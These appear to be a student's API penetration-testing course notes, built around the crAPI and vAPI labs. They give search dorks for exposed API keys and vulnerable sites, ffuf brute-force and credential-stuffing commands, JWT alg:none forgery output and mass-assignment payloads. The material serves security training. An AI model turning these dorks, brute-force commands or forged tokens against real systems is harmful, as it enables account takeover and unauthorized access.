# APISEC UNIVERSITY - API Penetration Testing Notes

## Lab Setup

Tools:

  * BurpSuite
  * Postman (sudo wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz && sudo tar -xvzf postman-linux-x64.tar.gz -C /opt && sudo ln -s /opt/Postman/Postman /usr/bin/postman)
  * Git
  * Docker
  * Go
  * mitmproxy2swagger (sudo pip3 install mitmproxy2swagger)
  * jwt_tool (https://github.com/ticarpi/jwt_tool.git)
  * kiterunner (https://github.com/assetnote/kiterunner.git)
  * Arjun (https://github.com/s0md3v/Arjun.git)
  * zaproxy (sudo apt install zaproxy)


Hacking Labs:

  * crAPI (https://github.com/OWASP/crAPI) - http://127.0.0.1:8888/login and http://127.0.0.1:8025/
  ```
  sudo curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml
  sudo docker-compose pull
  sudo docker-compose -f docker-compose.yml --compatibility up -d
  ```

  * vAPI - http://127.0.0.1/vapi
  ```
  git clone https://github.com/roottusk/vapi.git
  cd vapi
  sudo docker-compose up -d
  ```

## API Reconnaissance

Passive:

  * Google Dorking
  ```
  inurl:"/wp-json/wp/v2/users" site:AAAA.com (Finds all publicly available WordPress API user from specific site).

  intitle:"index.of" intext:"api.txt" (Finds publicly available API key files)

  inurl:"/api/v1" intext:"index of /" (Finds potentially interesting API directories)

  ext:php inurl:"api.php?action=" (Finds all sites with a XenAPI SQL injection vulnerability. (This query was posted in 2016; four years later, there are currently 141,000 results))

  intitle:"index of" api_key OR "api key" OR apiKey -pool
  ```

  * GitDorking
  ```
  filename:swagger.json

  extension: .json
  ```

  * Google-Hacking (https://pentest-tools.com/information-gathering/google-hacking)
  * Shodan
  ```
  hostname:"targetname.com" (Using hostname will perform a basic Shodan search for your target’s domain name. This should be combined with the following queries to get results specific to your target)

  "content-type: application/json" (APIs should have their content-type set to JSON or XML. This query will filter results that respond with JSON)

  "content-type: application/xml" (This query will filter results that respond with XML)

  "wp-json" (This will search for web applications using the WordPress API)
  ```
  * TruffleHog (https://github.com/trufflesecurity/trufflehog)
  * Wayback Machine

Active:

  * Nuclei
  * Nmap
  * Amass
  * FFUF

## Endpoint Analysis

  * Postman - proxy
  ```
  Configure Proxy:
  1 - Create a new collection
  2 - Click on "Capture Requests"
  3 - Enable proxy and select port
  4 - Enable "Save responses for requests"
  5 - Add URL in "URLs must contains"
  6 - Start capture
  ```

  * Burp Proxy

## API Authentication Attacks

Classic Authentication Attacks:

  * Brute Force
  ```
  Burp Pro Alternative - FFUF Example

  Command:
  ffuf -request req.txt -w xato-net-10-million-passwords-10000.txt -request-proto http -fc 401

  Request:

  POST /identity/api/auth/login HTTP/1.1
  Host: 127.0.0.1:8888
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: http://127.0.0.1:8888/login
  Content-Type: application/json
  Origin: http://127.0.0.1:8888
  Content-Length: 56
  Connection: close
  Cookie: XSRF-TOKEN=eyJpdiI6InEyblBFN3dGYjhvN2lhdGNFTmNtMWc9PSIsInZhbHVlIjoiNGkyTzdWNmJXYm1zdHFvbzVMZmJtY292UjcyalNPcjFFOHBwM3JxZW1CQTlLUndQMlpqandOdFpwcms1N3BFOHhISzRMRVRueno2alkvanVLRGxLM0Q5Sk5PQUFyNk1aOG1BZVkrR3ZXSEloQXpFam1IbDYrVXZGNjBGcS95WEkiLCJtYWMiOiI1ZjE5YzVjMzllZWZlMzQ2NWRmOGFiMDcyNGJlMTkxZDUwNjVmZWE1ZDBlMmYzZTA1OGU3NTUzNGM5ZTJkMTc2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlYwWlRvOEdzVW5jK0dqcTlPY2ZtckE9PSIsInZhbHVlIjoiQkhTeHNLWVJldEQ0d1NiKzRUSWZ6MmJUYlB4OXJjSFBmVWhTWk5JSkI2dEpqaThWRC9jcHpKekJwODZkVGNWRnJJOG1Dcmk4WEthRUl3U1o5RHhIY0daZ0czenZ0VEFpc1FyWTdsT29vek1yZWsxeitUeFFzUHp2RXZkOUhFQXQiLCJtYWMiOiIxODlkMzdjNzg1Yzc2Mzc1NjE4OTY4MzY2YWVkYzNiYjNjZTM0ZGFkZmI4ZjQ1N2VhYTVkYjhmZjRiNThlZTJhIiwidGFnIjoiIn0%3D
  Sec-Fetch-Dest: empty
  Sec-Fetch-Mode: cors
  Sec-Fetch-Site: same-origin

  {"email":"thiago123@teste.com","password":"FUZZ"}
  ```
  * Password Spray
  * Credential Stuffing
  ```
  Burp Pro Alternative - FFUF Example

  Command:
  ffuf -request req.txt -w user:FUZZ1 -w pass:FUZZ2 -request-proto http -mode pitchfork -x http://127.0.0.1:8080 -fc 401

  Request:

  POST /vapi/api2/user/login HTTP/1.1
  Host: 127.0.0.1
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Connection: close
  Content-Type: application/json
  Cookie: XSRF-TOKEN=eyJpdiI6InBOK2d4a0g5ck45Z0xDN0FGa2FYVFE9PSIsInZhbHVlIjoibXBydmpxMmFNTFRGSTlEb2tFVVpINnNpbm5MbjJWTGtIRG5YYm1OdjlpM0R2ZFlzZHZTbTRKZVRaaWVpNUZod3dXNzROT3ZVQ3BOcnRsN21HQXF5bzNuM0xWcjlwbGc0aEhQcGxRL3FUSnpZNFB5TmM3VDdOVW4yb093MTZ1S3MiLCJtYWMiOiJhODFjMWIzZmE3OGFjNTJmODA3NjViMjZmMDdmM2NlMjlmOGFlYzM3MDEwNTBlMzA5ODc5MTM4OTJkNDNhZDM3IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InB3dDBwZW5mb1FXN0dXalBDTkdpMnc9PSIsInZhbHVlIjoiRk05dGx5cTlORVlXUU9yVGxXWnMvaXRXVXluUmRwUjlFQUFld3RVcE9COUxiUVdTUHVPcStMYTg2S1JWaUpscUk5N3dwQXFDZ242UGtyOWNrMHVrUXYrdDFrYmg5ZE9oc1l6MHlQSjIxcFdSeUFVbXpHWGkwQ0djZWNHQ0RVa0wiLCJtYWMiOiI3ZjMzYTJjYjgzYWI0OTY1ZjRhYTI2N2I1YzYxYTQyNjcwMmVmNTU2MGJiY2M0NjEwZTBlZmU2ZDM2NjBmNWY2IiwidGFnIjoiIn0%3D
  Upgrade-Insecure-Requests: 1
  Sec-Fetch-Dest: document
  Sec-Fetch-Mode: navigate
  Sec-Fetch-Site: none
  Sec-Fetch-User: ?1
  Content-Length: 38

  {
    "email": "FUZZ1",
    "password": "FUZZ2"
  }
  ```

API Token Attacks:

  * jwt_tool - Identification Mode
  ```
  Command: python3 jwt_tool.py

  Example:

  python3 jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0aGlhZ28xMjNAdGVzdGUuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2OTk5OTIyNjYsImV4cCI6MTcwMDU5NzA2Nn0.G5yAa8q7jdpfuIJbTFa5lsxzi7T0gZ4mPcvMJIVhHhI227elo2sAj0iUHbK2r_V08r3ZYp4Z4gF_SikAmnfQcvP2GmP_Bl9YfNPOMMXrMeYlGzE_Ut4gjNBm1EZIYNlki2ZaqnLaIUCZQHEkyEcAKjljK5R0bL9-9rmUguyPmPEYXjfZ6Oqm9_SqoeqMB6-TLhTdQ7-BRbTyZvEUDgrOq9wVGLsX0BjKpnNDJv-QHMJ4B06tnsxuZGybp2ZZObj8107k2yVO33Nw95CKftaBWgtSOwS8JmGUaFLk9yPDrThqTHk_ZXNZ02qJzYsQviqJ44ms2uBqXy7soyxYcnBvaA

  Original JWT:

  =====================
  Decoded Token Values:                                                                                                                                                                        
  =====================                                                                                                                                                                        

  Token header values:                                                                                                                                                                         
  [+] alg = "RS256"

  Token payload values:                                                                                                                                                                        
  [+] sub = "thiago123@teste.com"
  [+] role = "user"
  [+] iat = 1699992266    ==> TIMESTAMP = 2023-11-14 17:04:26 (UTC)
  [+] exp = 1700597066    ==> TIMESTAMP = 2023-11-21 17:04:26 (UTC)

  Seen timestamps:                                                                                                                                                                             
  [*] iat was seen
  [*] exp is later than iat by: 7 days, 0 hours, 0 mins

  JWT common timestamps:                                                                                                                                                                       
  iat = IssuedAt                                                                                                                                                                               
  exp = Expires                                                                                                                                                                                
  nbf = NotBefore                                                                           
  ```
  * jwt_tool - Analyze Mode (All Tests)

  ```
  python3 jwt_tool.py -t TARGET -rh "Authorization: Bearer JWT_TOKEN" -M at
  ```

  * jwt_tool - Exploit Test (All Tests)

  ```
  Command: python3 jwt_tool.py JWT_TOKEN -X CODE (See help to view exploit codes)

  Example (alg:none):

  python3 jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0aGlhZ28xMjNAdGVzdGUuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2OTk5OTI5NzksImV4cCI6MTcwMDU5Nzc3OX0.mz98JpdCmHmoQ583nU7LNjeKl47K04v5usznUoX0rtwL6JRLCwAF2hohspqgQhDSgq7n0781jrTFHAm5Yys4LGzZH_RtmKTKHFeqzgk-MqRDa5EX7a_lpSYMiSCTMXpsFs7CQ6PWB-LFo2koq-bPPW996vDVZ9bwQqVScQJGxfWhVKyPwCCDQAJ8o6Sqf63FTiXCg2g-Wgx3KTB7oVRHV8uVUvE6AE4LMdzNq8jYKD7E9DTUaSTdLM6b6n2kc5KkZ7bwo0QbMNAVkHv5DmdxeqrxFjUO2mDohiCzmPROSqH2LhghmX1eDtWJtyhANijiaie7yeG8ByMr7j3K9te_bw -X a  

  Original JWT:

  jwttool_4fefe0858d52b40bd74a0c2b1f6d3a18 - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
  (This will only be valid on unpatched implementations of JWT.)                                                                                                                               
  [+] eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0aGlhZ28xMjNAdGVzdGUuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2OTk5OTI5NzksImV4cCI6MTcwMDU5Nzc3OX0.
  jwttool_9fa407885e79c5e222c1b5ec7b0fe98b - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
  (This will only be valid on unpatched implementations of JWT.)                                                                                                                               
  [+] eyJhbGciOiJOb25lIn0.eyJzdWIiOiJ0aGlhZ28xMjNAdGVzdGUuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2OTk5OTI5NzksImV4cCI6MTcwMDU5Nzc3OX0.
  jwttool_105741cdda8795cb0c7799910d6a4a9b - EXPLOIT: "alg":"NONE" - this is an exploit targeting the debug feature that allows a token to have no signature
  (This will only be valid on unpatched implementations of JWT.)                                                                                                                               
  [+] eyJhbGciOiJOT05FIn0.eyJzdWIiOiJ0aGlhZ28xMjNAdGVzdGUuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2OTk5OTI5NzksImV4cCI6MTcwMDU5Nzc3OX0.
  jwttool_4cf66d99e9f6c5c7a187c7f1a8b8sa74c - EXPLOIT: "alg":"nOnE" - this is an exploit targeting the debug feature that allows a token to have no signature
  (This will only be valid on unpatched implementations of JWT.)                                                                                                                               
  [+] eyJhbGciOiJuT25FIn0.eyJzdWIiOiJ0aGlhZ28xMjNAdGVzdGUuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2OTk5OTI5NzksImV4cCI6MTcwMDU5Nzc3OX0.
  ```

  * jwt_tool - Crack HMAC Token
  ```
  python3 jwt_tool.py JWT_TOKEN -C -d WORDLIST
  ```

## Exploiting API Authorization

  * Broken Object Level Authorization (BOLA)
  * Broken Function Level Authorization (BFLA)

Where BOLA is all about accessing resources that do not belong to you, BFLA is all about performing unauthorized actions. BFLA vulnerabilities are common for requests that perform actions of other users. These requests could be lateral actions or escalated actions. Lateral actions are requests that perform actions of users that are the same role or privilege level. Escalated actions are requests that perform actions that are of an escalated role like an administrator.

## Improper Assets Management

Change version of api endpoint.

Example Request:

  ```
POST /api/accounts

{
"ver":1.0,
"user":"hapihacker"
}
```

Example Modified Request:

```
POST /api/accounts

{
"ver":2.0,
"user":"hapihacker"
}
```

## Mass Assignment Attacks

Mass Assignment vulnerabilities are present when an attacker is able to overwrite object properties that they should not be able to. A few things need to be in play for this to happen. An API must have requests that accept user input, these requests must be able to alter values not available to the user, and the API must be missing security controls that would otherwise prevent the user input from altering data objects. The classic example of a mass assignment is when an attacker is able to add parameters to the user registration process that escalate their account from a basic user to an administrator. The user registration request may contain key-values for username, email address, and password. An attacker could intercept this request and add parameters like "isadmin": "true". If the data object has a corresponding value and the API provider does not sanitize the attacker's input then there is a chance that the attacker could register their own admin account.

Parameters vuln - Example:

```
"isadmin": true
"isadmin":"true"
"admin": 1
"admin": true
```

## Server-Side Request Forgery

Server-Side Request Forgery (SSRF) is a vulnerability that takes place when an application retrieves remote resources without validating user input. An attacker can supply their own input, in the form of a URL, to control the remote resources that are retrieved by the targeted server. When you have control over what resources a server requests then you can gain access to sensitive data or worse completely compromise a vulnerable host. SSRF is number 10 on the 2021 OWASP Top 10 list and is a growing threat to APIs.

## Injection Attacks

  * SQL Injection
  * NoSQL Injection
  * OS Injection

## Evasion and Combining Techniques

  * String Terminators
  * Case Switching
  * Encoding Payloads
